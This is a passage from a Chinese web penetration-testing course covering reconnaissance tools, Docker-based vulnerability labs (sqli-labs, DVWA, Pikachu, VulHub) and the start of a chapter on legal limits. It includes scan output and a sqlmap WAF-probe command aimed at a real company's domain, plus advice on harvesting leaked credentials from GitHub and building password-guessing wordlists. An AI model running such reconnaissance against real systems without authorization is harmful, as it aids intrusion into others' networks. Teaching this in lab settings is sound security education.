Nmap done: 1 IP address (1 host up) scanned in 24.95 seconds
</pre>
</div>

<p>
-A参数开启端口扫描、系统检测、版本检测、脚本扫描及路由追踪，是一个比较
常用的参数。
</p>

<p>
从扫描结果可以看到，lagou.com开放端口：80、135、139、443、445、593、
4444 以及对应的服务名称。
</p>
</div>
</div>
<div id="outline-container-网站指纹识别" class="outline-4">
<h4 id="网站指纹识别">网站指纹识别</h4>
<div class="outline-text-4" id="text-网站指纹识别">
<p>
网站指纹是 Web 服务组件在开发时留下的类型、版本等标记信息，包括 Web服
务器指纹、Web 运用指纹及前端框架指纹等。
</p>

<p>
除了前面用 Nmap 扫描端口和服务的方法，我们还可以通过前端网页和返回一些
HTTP头信息来判断网站使用的哪些开发框架、服务器、系统，在渗透测试时也可
以提供有针对性的测试思路。
</p>

<p>
我比较推荐 Chrome插件 <b><a href="https://chromewebstore.google.com/detail/gppongmhjkpfnbhagpmjfkannfbllamg">Wappalyzer</a></b> 。在你打开网站后，点击插件，按钮就
会弹出如下类似信息，网站的指纹信息一目了然。
</p>


<figure id="org5cc75df">
<img src="./images/CgqCHl_ZtE2AVvG5AACSsPCq2no845.png" alt="CgqCHl_ZtE2AVvG5AACSsPCq2no845.png" width="80%">

</figure>

<p>
图 12：Wappalyzer
</p>

<p>
还有一个在线检测网站也支持指纹检测：<a href="https://scan.top15.cn/web/">https://scan.top15.cn/web/</a>，如下图所示：
</p>


<figure id="org31bd972">
<img src="./images/Ciqc1F_ZtFeAAwudAAHLer0XgI8177.png" alt="Ciqc1F_ZtFeAAwudAAHLer0XgI8177.png" width="80%">

</figure>

<p>
图 13：ThreatScan
</p>

<p>
其他检测指纹的工具还有 WhatWeb、WPScan、JoomScan等，你可以自行搜索试用。
</p>
</div>
</div>
<div id="outline-container-旁站与-c-段查询" class="outline-4">
<h4 id="旁站与-c-段查询">旁站与 C 段查询</h4>
<div class="outline-text-4" id="text-旁站与-c-段查询">
<p>
有时测试的网站非常坚固，找不到任何漏洞，那我们就可以尝试 <b>对“旁站”进
行渗透测试</b> 。旁站即同一服务器上的其他域名网站，如果你能攻下该旁站，就
有机会间接拿到目标网站的权限。
</p>

<p>
还有另一种方法就是 <b>查询 C 段 IP</b> ，即同一内网段的服务器。比如
lagou.com的 IP 为 106.75.118.232，那它的 C 段 IP 为
106.75.118.1~106.75.118.255，通过攻下同一 C段的服务器，再间接渗透到目
标服务器。
</p>

<p>
无论是旁站还是 C段渗透方式，都是尝试从目标网站的旁路途径去间接渗透目标。
在这里我推荐几个在线查询旁站和C 段的网站，同时提供一些指纹检测信息。
</p>

<p>
（1）<a href="https://www.webscan.cc/">https://www.webscan.cc/</a>
</p>


<figure id="org107871a">
<img src="./images/CgpVE1_ZtGKACONzAAJroYitakc640.png" alt="CgpVE1_ZtGKACONzAAJroYitakc640.png" width="80%">

</figure>

<p>
图 14：The Web of WebScan
</p>

<p>
（2）<a href="https://chapangzhan.com/">https://chapangzhan.com/</a>
</p>


<figure id="org1741602">
<img src="./images/Cip5yF_ZtGmAb6vpAAEgG3hQbFE603.png" alt="Cip5yF_ZtGmAb6vpAAEgG3hQbFE603.png" width="80%">

</figure>

<p>
图 15：IP 查询
</p>
</div>
</div>
<div id="outline-container-waf-探测" class="outline-4">
<h4 id="waf-探测">WAF 探测</h4>
<div class="outline-text-4" id="text-waf-探测">
<p>
当网站开启 WAF（Web防火墙）时，很多测试请求都会被拦截，导致无法正常扫
描。此时就要分析 WAF找到绕过的方法，否则很难挖到漏洞。在不知道的情况下，
还以为真的没有漏洞，其实有时只是被WAF 拦截了而已。不过就算挖到了漏洞，
利用起来也有一定的门槛。
</p>

<p>
因此，在测试前，若发现发包经常测试失败的话，除非网络不通，否则都建议先
探测下WAF。如果存在 WAF 就尝试寻找绕过的方法，再改造测试用例进行重试。
</p>

<p>
上一讲中介绍的 SQLMap 就支持 WAF 检测，上文介绍的<a href="https://scan.top15.cn/web/">TScan</a>也支持，不过有时
会误报。这里我主要介绍一下 SQLMap 检测 WAF的方法，使用命令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">python sqlmap.py -u "http://www.lagou.com" --identify-waf --batch
</pre>
</div>

<p>
上述代码中，&#x2013;identify-waf 参数开启 WAF 检测，&#x2013;batch参数不询问用户输
入，按默认执行。
</p>

<p>
SQLMap 既支持常见 WAF 的检测，也支持自己写脚本扩展检测能力。
</p>
</div>
</div>
<div id="outline-container-敏感信息收集" class="outline-4">
<h4 id="敏感信息收集">敏感信息收集</h4>
<div class="outline-text-4" id="text-敏感信息收集">
<p>
2019 年 4月发生了一起大疆前员工泄密源码的事件，该名员工将大疆公司的在
用产品源码开放到GitHub上，其中还包含云服务器上登录密钥，导致他人可以登
录服务器查看上面存在的各种用户数据，最后被判刑。
</p>


<figure id="orgffd378e">
<img src="./images/Cip5yF_ZtHmASYfAAAEXnRS5ebY685.png" alt="Cip5yF_ZtHmASYfAAAEXnRS5ebY685.png" width="80%">

</figure>

<p>
图 16：大疆前员工泄密源码事件
</p>

<p>
从这件事也可以看到在网络上泄露的一些敏感信息，有时会直接导致服务器被入
侵，公司相关的知识技术产权被窃取，造成实际的经济财产损失。
</p>

<p>
因此，在授权的渗透测试过程中，我们要多方收集与目标相关的信息，包括
Google、GitHub、社交平台等多方渠道。我曾多次利用 GitHub找到一些账号密
码或密钥，从而获得授权测试的网站的最高权限，收集 GitHub相关的敏感信息
如下：
</p>

<ul class="org-ul">
<li>Gitrob，<a href="https://github.com/michenriksen/gitrob">https://github.com/michenriksen/gitrob</a>；</li>

<li>码小六，<a href="https://github.com/4x99/code6">https://github.com/4x99/code6</a>；</li>

<li>GitMonitor，<a href="https://github.com/Talkaboutcybersecurity/GitMonitor">https://github.com/Talkaboutcybersecurity/GitMonitor</a>。</li>
</ul>

<p>
根据收集到的相关信息，我们还可以制作字典用来猜解一些相关账号和密码，此类的相关工具有：
</p>

<ul class="org-ul">
<li>Wordhound，<a href="https://github.com/kurobeats/wordhound">https://github.com/kurobeats/wordhound</a>；</li>

<li>BruteScrape，<a href="https://github.com/cheetz/brutescrape">https://github.com/cheetz/brutescrape</a>。</li>
</ul>

<p>
最后我再推荐几款综合能力较好的信息收集工具。
</p>

<ul class="org-ul">
<li><a href="https://github.com/lanmaster53/recon-ng">Recon-NG</a>是一款被动信息收集工具，它可以通过搜索获取 IP地址、地理位置、
用户、邮件地址、密码泄露或者其他敏感信息，最终生成一份完整报告。</li>
</ul>


<figure id="orgd62b597">
<img src="./images/Ciqc1F_ZtI6AbSuGAAFRQ7AvPZU584.png" alt="Ciqc1F_ZtI6AbSuGAAFRQ7AvPZU584.png" width="80%">

</figure>

<p>
图 17：Recon-NG
</p>

<ul class="org-ul">
<li><a href="https://github.com/kennbroorg/iKy">iKy</a>的界面很酷，它能够从Twitter、GitHub、Skype、Linkedin、Instagram等
社交平台上收集信息，但需要提前设置各平台上的 API KEY，可以输入一个邮
箱地址去搜索其上述平台上的关联信息，最后会以可视化效果展示出来，如下
图所示。</li>
</ul>


<figure id="orga8856d7">
<img src="./images/CgqCHl_ZtJuAMTSAAGHC1Ng-II8825.png" alt="CgqCHl_ZtJuAMTSAAGHC1Ng-II8825.png" width="80%">

</figure>

<p>
图 18：iKy
</p>

<ul class="org-ul">
<li><a href="https://github.com/leebaird/discover">discover</a>综合使用了很多工具，包括dnsrecon、goofile、whois、recon-ng、
dnssy\Nikto等，它能够收集邮箱地址、雇员名字、主机信息、域名、IP等一
系列信息，最后提供 html 报告。</li>
</ul>

<p>
信息收集不局限于我上面举例的这些，有些你通过 Google搜索到的文档、图片、
敏感文件和目录等都可以。在后面的渗透测试过程中，说不定它们就能派上用场
了。
</p>

<p>
<b>收集的信息不怕多，就怕不全</b> 。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲我主要介绍了一些收集目标相关信息的常用方法和工具，包括域名和IP、
端口服务、网站指纹、旁站和 C段、WAF、敏感信息等信息的收集。但信息收集
不应局限于此，你可以根据渗透测试的需要，对扩展收集信息的范围，灵活变通。
</p>

<p>
收集信息之所以如此关键，是因为它能曝光出更多的攻击面，有助于我们寻找到
目标的短板，这常常决定渗透测试的成败。
</p>

<p>
前面讲的域名收集方法中介绍了不少工具，但扫出来的域名该如何批量检测是否
可访问呢？手工显然是不合理的，毕竟数量通常都很大。因此，我们需要自己动
手写个脚本。
</p>

<p>
你可以尝试写一个看看，比如用 Python 的 requests模块。但你要注意一下，
有些域名只允许 https 或 http的方式连接，需要把这些因素考虑进去。如果域
名较多，你还要考虑下多线程并发提高检测速度，同时还要做好域名的去重。比
如下列脚本的检测效果：
</p>


<figure id="org672a976">
<img src="./images/CgpVE1_ZtKeAFVB3AADSDEvYq_I765.png" alt="CgpVE1_ZtKeAFVB3AADSDEvYq_I765.png" width="80%">

</figure>

<p>
图 19：域名验证脚本
</p>

<p>
你可以尝试写一个域名验证脚本（Python、Shell&#x2026;&#x2026;），如果遇到了什么问
题或者是有什么心得，欢迎在留言区分享和讨论。
</p>

<p>
下一讲，我将带你了解如何自己搭建用于练习漏洞攻防的靶场，避免你在他人网
站做测试，造成承担不必要的违法责任。
</p>

<blockquote>
<p>
信息收集决定了你能找到的攻击面有多大
</p>

<p>
也决定了你能否成功渗透目标。
</p>
</blockquote>
</div>
</div>
</section>
<section id="outline-container-h:db16c65f-9437-4c31-8954-846790f7cc2f" class="outline-2">
<h2 id="h:db16c65f-9437-4c31-8954-846790f7cc2f">靶场：搭建漏洞练习环境</h2>
<div class="outline-text-2" id="text-h:db16c65f-9437-4c31-8954-846790f7cc2f">
<p>
你好，我是赢少良。这一讲我来和你聊一聊“靶场”，也就是存在漏洞的实验环
境，为了方便你边学习边实践，我强烈建议你在学习前搭建好靶场环境。
</p>

<p>
本讲主要介绍几款用于学习 Web
漏洞的常见靶场，你可以直接跟着我介绍的操作方法边看边安装。
</p>
</div>
<div id="outline-container-安装与使用-docker-容器" class="outline-3">
<h3 id="安装与使用-docker-容器">安装与使用 Docker 容器</h3>
<div class="outline-text-3" id="text-安装与使用-docker-容器">
<p>
以前我们搭建网站，需要在服务器依次安装 Apache、PHP、MySQL等应用，比较
烦琐，而且不同的源还有不同的应用版本，跟系统环境又可能存在兼容性的问题，
这就需要手动添加源地址，甚至是自己编译安装。
</p>

<p>
后来出现了 XAMPP、PHPStudy 等优秀的 PHP集成环境，可以非常便捷地安装。
但是安装好之后，如果要使用某些 PHP网站代码，我们仍然需要查找下载，再部
署上去。PHP 网站代码有可能与 PHP版本、系统环境存在兼容问题，或者需要额
外安装其他依赖库。若需要迁移服务器，那上述安装过程又得重来一遍。
</p>

<p>
到底有没有高效的安装方式呢？有，答案就是 Docker。
</p>
</div>
<div id="outline-container-docker-安装" class="outline-4">
<h4 id="docker-安装">Docker 安装</h4>
<div class="outline-text-4" id="text-docker-安装">
<p>
本课程主要在 Ubuntu 系统下进行演示，在 Ubuntu 下可通过以下命令安装
Docker：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo apt-get update
$ sudo apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common
$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
$ sudo add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable"
$ sudo apt-get update
$ sudo apt-get install docker-ce docker-ce-cli containerd.io
</pre>
</div>

<p>
如果是 Windows 或 macOS系统，可以直接从<a href="https://www.docker.com/products/docker-desktop">官网</a>下载安装包安装，它会自动识
别你当前的操作系统，并提供相应平台的下载地址。
</p>

<p>
安装完成后，可运行以下命令，若输出“Hello from Docker！”则代表安装成功：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo docker run hello-world
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
0e03bdcc26d7: Pull complete 
Digest: sha256:4cf9c47f86df71d48364001ede3a4fcd85ae80ce02ebad74156906caff5378bc
Status: Downloaded newer image for hello-world:latest
Hello from Docker!
This message shows that your installation appears to be working correctly.
To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.
To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash
Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/
For more examples and ideas, visit:
 https://docs.docker.com/get-started/
</pre>
</div>
</div>
</div>
<div id="outline-container-docker-常用命令" class="outline-4">
<h4 id="docker-常用命令">Docker 常用命令</h4>
<div class="outline-text-4" id="text-docker-常用命令">
<p>
安装完之后，我再介绍一些 Docker 的常用命令，基本是你在使用 Docker会用
到的。
</p>


<figure id="org4a4e87e">
<img src="./images/Cip5yF_ayluADYpRAAE2DM3MpC8011.png" alt="Cip5yF_ayluADYpRAAE2DM3MpC8011.png" width="80%">

</figure>
</div>
</div>
</div>
<div id="outline-container-安装-sqli-labs-靶场" class="outline-3">
<h3 id="安装-sqli-labs-靶场">安装 sqli-labs 靶场</h3>
<div class="outline-text-3" id="text-安装-sqli-labs-靶场">
<p>
sqli-labs 是一款用于学习 SQL 注入的靶场平台，覆盖了各种类型的 SQL注入，
题目共 75 道，按难度划分为 4 页。sqli-labs靶场的难度循序渐进，对于提高
SQL 注入实战能力有很好的帮助。sqli-labs靶场的项目开源地址为
<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a>。
</p>

<p>
那如何使用 Docker 快速安装 sqli-labs 呢？首先，搜索 sqli-labs 镜像，挑
战STARS 星标最多的镜像，这里选择“acgpiano/sqli-labs”镜像：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo docker search sqli-labs
NAME                       DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED
acgpiano/sqli-labs         sql injection labs                              12
c0ny1/sqli-labs            sqli-labs 是一个 sql 注入的练习靶机，项目地址为…                   2
sari3l/sqli-labs-safedog   Base: sqli-labs &amp; safedog(version Linux64_2.…   1
promiseit/sqli-labs                                                        1
0bajie0/sqli-labs                                                          1
tinmin/sqli-labs                                                           0
area39/sqli-labs           sql inject                                      0
hl0rey/sqli-labs                                                           0
sari3l/sqli-labs           Base: Debian-Wheey + MySQL 5.5 + PHP 5          0
sari3l/sqli-labs-yunsuo    Base: sqli-labs &amp; yunsuo(version Linux_3.0.6…   0
aqyoung/sqli-labs                                                          0
xuanxuan3000/sqli-labs                                                     0
fengbj/sqli-labs           lamp+sqli-labs please down 2.0                  0
jylsec/sqli-labs                                                           0
baohs/sqli-labs-cenos                                                      0
mendickxiao/sqli-labs      sqli-labs based on ubuntu                       0
r0ulier/sqli-labs          sqlInjection                                    0
</pre>
</div>

<p>
然后拉取镜像：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo docker pull acgpiano/sqli-labs
Using default tag: latest
latest: Pulling from acgpiano/sqli-labs
10e38e0bc63a: Pull complete 
0ae7230b55bc: Pull complete 
fd1884d29eba: Pull complete 
4f4fb700ef54: Pull complete 
2a1b74a434c3: Pull complete 
fb846398c5b7: Pull complete 
9b56a3aae7bc: Pull complete 
1dca99172123: Pull complete 
1a57c2088e59: Pull complete 
b3f593c73141: Pull complete 
d6ab91bda113: Pull complete 
d18c99b32885: Pull complete 
b2e4d0e62d16: Pull complete 
91b5c99fef87: Pull complete 
bf0fd25b73be: Pull complete 
b2824e2cd9b8: Pull complete 
97179df0aa33: Pull complete 
Digest: sha256:d3cd6c1824886bab4de6c5cb0b64024888eeb601fe18c7284639db2ebe9f8791
Status: Downloaded newer image for acgpiano/sqli-labs:latest
docker.io/acgpiano/sqli-labs:latest
</pre>
</div>

<p>
接着再在容器中运行 sqli-labs：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo docker run -dt --name sqli-labs -p 80:80 --rm acgpiano/sqli-labs                   [13:36:58]
2c40ccae95775f7dca6064c95e5eed9c58e66c93e92775a04f22f407b665d331
</pre>
</div>

<p>
各参数含义如下所示：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">-d：代表后台运行
-t：为容器分配伪终端
--name：命名容器
-p：指定映射端口，此处将 acgpiano/sqli-labs 的 80 端口映射到本地的 80 端口
--rm：退出时自动移除容器
</pre>
</div>

<p>
现在我们直接访问<a href="http://localhost">http://localhost</a>，可以看到 sqli-labs已经成功运行了。
</p>


<figure id="org3598d26">
<img src="./images/Cip5yF_ZuAGATUgkAAGVntvgIOM781.png" alt="Cip5yF_ZuAGATUgkAAGVntvgIOM781.png" width="80%">

</figure>

<p>
图 1：sqli-labs 成功运行
</p>

<p>
最后点击“Setup/reset Database for labs”链接完成数据库的安装：
</p>


<figure id="org9e6cf6a">
<img src="./images/Ciqc1F_ZuAmAJIaRAAERioET74I030.png" alt="Ciqc1F_ZuAmAJIaRAAERioET74I030.png" width="80%">

</figure>

<p>
图 2：完成数据库安装
</p>

<p>
到此，sqli-labs 安装结束！
</p>
</div>
</div>
<div id="outline-container-安装-dvwa-靶场" class="outline-3">
<h3 id="安装-dvwa-靶场">安装 DVWA 靶场</h3>
<div class="outline-text-3" id="text-安装-dvwa-靶场">
<p>
DVWA（Damn Vulnerable Web Application）是一款比较著名的漏洞靶场，很多
Web 安全的初学者都会拿它来练习，一些高校以及相关书籍里面也会介绍它。
</p>

<p>
DVWA的项目开源地址为<a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a>。
</p>

<p>
DVWA 靶场可以直接通过 Docker 安装：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo docker pull citizenstig/dvwa
$ sudo docker run -d --name dvwa --rm -p80:80 citizenstig/dvwa
</pre>
</div>

<p>
安装成功后，打开<a href="http://localhost:8080">http://localhost</a>：
</p>


<figure id="org036633c">
<img src="./images/Ciqc1F_ZuBWAJBW5AAFVUYKVo8w698.png" alt="Ciqc1F_ZuBWAJBW5AAFVUYKVo8w698.png" width="80%">

</figure>

<p>
图 3：DVWA靶场
</p>

<p>
然后点击“Create/Reset Database”创建数据库，使用默认密码
admin/password登录，即可正常使用。做题时它能直接提供阅读源码的功能，不
过题目相对少一些。
</p>


<figure id="orgf69f650">
<img src="./images/Ciqc1F_ZuByAHaCUAAHUf-R43-Q924.png" alt="Ciqc1F_ZuByAHaCUAAHUf-R43-Q924.png" width="80%">

</figure>

<p>
图 4：DVWA 支持在线查看源码
</p>

<p>
上面的 XSS 漏洞默认是安全的，在实际练习时，可以在“DVWA Security“中设
置安全等级，即题目的难度等级，共有 4 等，其中 Impossible代表的是已修复
漏洞的情况，可以用来熟悉如何修复漏洞。
</p>


<figure id="org4cf1409">
<img src="./images/CgqCHl_ZuCOADWKnAAKUKNFpXFI694.png" alt="CgqCHl_ZuCOADWKnAAKUKNFpXFI694.png" width="80%">

</figure>

<p>
图5：DVWA 安全等级设置
</p>
</div>
</div>
<div id="outline-container-安装-pikachu-靶场" class="outline-3">
<h3 id="安装-pikachu-靶场">安装 Pikachu 靶场</h3>
<div class="outline-text-3" id="text-安装-pikachu-靶场">
<p>
Pikachu 也是一款 Web 漏洞靶场，涵盖各种 Web 漏洞类型的练习，也是基于
PHP+MySQL搭建的平台，是由国人开发的。平台采用中文描述和基本的页面设计，
相比sqli-labs 这种单调的界面还是好看很多的。Pikachu的项目开源地址为
<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a>。
</p>

<p>
安装 Pikachu 也很简单，通过 Docker 即可快速安装。我们先搜索下镜像：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo docker search pikachu
NAME                                  DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED
area39/pikachu                        https://github.com/zhuifengshaonianhanlu/pik…   3
……
</pre>
</div>

<p>
然后取第一个镜像安装&amp;运行：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo docker pull area39/pikachu
$ sudo docker run -d --name pikachu --rm -p80:80 area39/pikachu
</pre>
</div>

<p>
安装成功后，打开<a href="http://localhost:8080">http://localhost</a>即可。
</p>


<figure id="org3846707">
<img src="./images/CgqCHl_ZuC6AayiZAAMqHiaWbIU414.png" alt="CgqCHl_ZuC6AayiZAAMqHiaWbIU414.png" width="80%">

</figure>

<p>
图 6：Pikachu 靶场
</p>
</div>
</div>
<div id="outline-container-ctf-赛题练习" class="outline-3">
<h3 id="ctf-赛题练习">CTF 赛题练习</h3>
<div class="outline-text-3" id="text-ctf-赛题练习">
<p>
CTF（Capture The Flag）夺旗赛，在网络安全领域中指的是网络安全技术人员
之间进行技术竞技的一种比赛形式。CTF起源于 1996 年 DEFCON全球黑客大会，
以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，CTF
已经成为全球范围网络安全圈流行的竞赛形式。
</p>

<p>
一些 CTF出题方经常会直接搭建现成的漏洞测试环境供参赛者使用，有些赛后会
取消，有些会一直保留。所以你也可以直接利用现成的CTF赛题环境来练习，连
搭建环境这一步都省去了。对于一些未保留在线赛题环境的CTF 题目，就只能自
己搭建了。
</p>

<p>
前面的漏洞靶场更新频率不高，CTF赛题会更与时俱进一些，每年都有新比赛和
新赛题，特别是新的漏洞场景和利用技术，这在CTF 上很容易看到。
</p>


<figure id="org22334b4">
<img src="./images/Ciqc1F_ZuDiAeLPeAAK1kIaowLY092.png" alt="Ciqc1F_ZuDiAeLPeAAK1kIaowLY092.png" width="80%">

</figure>

<p>
图 7：CTF TIME
</p>

<p>
各种国内外的赛事、题目与解答（write-up）都可通过<a href="https://ctftime.org/">该链接</a>获取到，我在这里
顺便也介绍几个现成的Web 漏洞 CTF 在线练习环境：
</p>

<p>
<b>1. XCTF攻防世界</b> ：<a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn</a>
</p>


<figure id="org7ed713a">
<img src="./images/CgpVE1_ZuFqAH3WWAAMOpy42Cuc721.png" alt="CgpVE1_ZuFqAH3WWAAMOpy42Cuc721.png" width="80%">

</figure>


<figure id="orgbc6f946">
<img src="./images/CgpVE1_ZuGCAdoE4AAKZFZivpWQ215.png" alt="CgpVE1_ZuGCAdoE4AAKZFZivpWQ215.png" width="80%">

</figure>

<p>
图 8：XCTF 攻防世界
</p>

<p>
<b>2. SQL注入挑战平台</b> ：<a href="http://redtiger.labs.overthewire.org/">http://redtiger.labs.overthewire.org</a>
</p>


<figure id="org843444d">
<img src="./images/Cip5yF_ZuGqAeCGsAAGlHZA_JGs807.png" alt="Cip5yF_ZuGqAeCGsAAGlHZA_JGs807.png" width="80%">

</figure>

<p>
图 9：SQL 注入挑战平台
</p>

<p>
<b>3. 韩国 Web 安全挑战平台</b> ：<a href="https://webhacking.kr/">https://webhacking.kr/</a>
</p>


<figure id="orgefd015f">
<img src="./images/Cip5yF_ZuHSAWPRUAAKJfGvDxu0291.png" alt="Cip5yF_ZuHSAWPRUAAKJfGvDxu0291.png" width="80%">

</figure>

<p>
图 10：韩国 Web 安全挑战平台
</p>

<p>
<b>4. Websec CTF练习平台</b> ：<a href="http://www.websec.fr/#">http://www.websec.fr/</a>
</p>


<figure id="orga5cb7fe">
<img src="./images/CgqCHl_ZuIeAGZpmAADl8TfMSMQ212.png" alt="CgqCHl_ZuIeAGZpmAADl8TfMSMQ212.png" width="80%">

</figure>

<p>
图 11：Websec CTF 练习平台
</p>

<p>
<b>5. 网络信息安全攻防学习平台</b> ：<a href="http://hackinglab.cn/index.php">http://hackinglab.cn/index.php</a>
</p>


<figure id="org7644e63">
<img src="./images/CgqCHl_ZuI6AZUYIAAey0yr4Jmk015.png" alt="CgqCHl_ZuI6AZUYIAAey0yr4Jmk015.png" width="80%">

</figure>

<p>
图 12：网络信息安全攻防学习平台
</p>

<p>
<b>6. 国外的 XSS 挑战平台</b> ：<a href="http://prompt.ml/0">http://prompt.ml/</a>
</p>


<figure id="orgf01759e">
<img src="./images/CgpVE1_ZuJqAYWnQAACsYbsaYR0177.png" alt="CgpVE1_ZuJqAYWnQAACsYbsaYR0177.png" width="80%">

</figure>

<p>
图 13：国外的 XSS 挑战平台
</p>

<p>
你可以根据自己的喜好做选择进行练习。
</p>
</div>
</div>
<div id="outline-container-安装-vulhub-真实漏洞靶场" class="outline-3">
<h3 id="安装-vulhub-真实漏洞靶场">安装 VulHub 真实漏洞靶场</h3>
<div class="outline-text-3" id="text-安装-vulhub-真实漏洞靶场">
<p>
Vulhub 是一款基于 Docker 和 docker-compose的漏洞测试靶场，进入对应目录
并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安
全研究者更加专注于漏洞原理本身。Vulhub的项目开源地址为
<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a>。
</p>

<p>
前面的靶场都是精心构造的漏洞场景，与真实的漏洞场景还是有一些差异的。为
了提高实战水平，熟悉更多的真实漏洞场景，建议你安装VulHub 来重现各种历
史漏洞进行实战练习。
</p>

<p>
对于每个漏洞，VulHub都有相应的文档描述其漏洞原理以及测试利用方法，你在
重现漏洞后，可以进一步研究相关漏洞类型的利用技术，并对漏洞代码进行阅读，
以提高代码审计能力。
</p>

<p>
我们需要先从 GitHub 上下载 VulHub，然后进行相应目录去创建和运行容器：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ git clone https://github.com/vulhub/vulhub
$ cd vulhub/flask/ssti
$ sudo docker-compose up -d
</pre>
</div>

<p>
安装使用都很方便。
</p>

<p>
该项目几乎每个月都在更新，非常适合用于检测、利用和防御漏洞时的测试环境搭建。
</p>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲我主要介绍了一些用来实战漏洞攻防的训练靶场，并重点介绍了 Docker
快速搭建环境的方法，它相比传统方法中一个个工具的安装更加便捷；同时，靶
场还能避免对真实网站非法测试的风险。
</p>

<p>
我向你介绍了 sqli-lab、DVWA、Pikachu、VulHub这些业界常用的漏洞靶场，你
可以都安装了，然后跟着后面的教程，边学边动手操作，以提高自己的实战能力，
以及对漏洞的理解。
</p>

<p>
除了上述靶场之外，你如果还知道其他好的靶场，也欢迎在留言区中推荐。
</p>

<p>
下一讲，我将带你了解在渗透测试过程中需要注意的法律法规。之后，咱们就会
进入本课程最核心的内容，模块二的漏洞攻防。
</p>


<figure id="org023e3f5">
<img src="./images/Ciqc1F_Z3sOAUL7NAAEDu5ea3Q0004.png" alt="Ciqc1F_Z3sOAUL7NAAEDu5ea3Q0004.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:6ed01985-277e-4846-87e1-1d70df16aa14" class="outline-2">
<h2 id="h:6ed01985-277e-4846-87e1-1d70df16aa14">法律法规：如何合法地进行渗透测试</h2>
<div class="outline-text-2" id="text-h:6ed01985-277e-4846-87e1-1d70df16aa14">
<p>
你好，我是赢少良。渗透测试是模拟黑客攻击的技术手段去业务产品进行安全测
试，将发现的漏洞和风险以测试报告的形式同步给客户，并协助其修复，防止被
黑客攻击入侵。
</p>

<p>
<b>任何未经授权的渗透测试都是违法的。</b> 这句话就是本文要说的重点。
</p>
</div>
<div id="outline-container-网络安全法" class="outline-3">
<h3 id="网络安全法">网络安全法</h3>
<div class="outline-text-3" id="text-网络安全法">
<p>
2017 年 6 月 1日发布的《中华人民共和国网络安全法》，对一些网络犯罪行为
有了更明确的规定，这里我主要讲下涉及个人的相关规定，其对应的法律条文摘
抄如下：
</p>

<blockquote>
<p>
第十二条　任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社 会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽 动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖 主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、 传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和 其他合法权益等活动。
</p>

<p>
第二十七条　任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。
</p>

<p>
第四十四条　任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。
</p>

<p>
第四十六条　任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。
</p>

<p>
第四十八条　任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。
</p>

<p>
第七十六条　本法下列用语的含义：<br>
（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。
</p>
</blockquote>

<p>
与本课程息息相关的就是第 27条规定，希望你能牢记： <b>主动或协助他人入侵、
提供黑客工具、发送恶意程序等行为都属于违法行为</b> 。
</p>
</div>
</div>
<div id="outline-container-刑法" class="outline-3">
<h3 id="刑法">刑法</h3>
<div class="outline-text-3" id="text-刑法">
<p>
《刑法》第 285 条和第 286条中，分别规定了非法入侵计算机信息系统罪和破
坏计算机信息系统罪：
</p>

<blockquote>
<p>
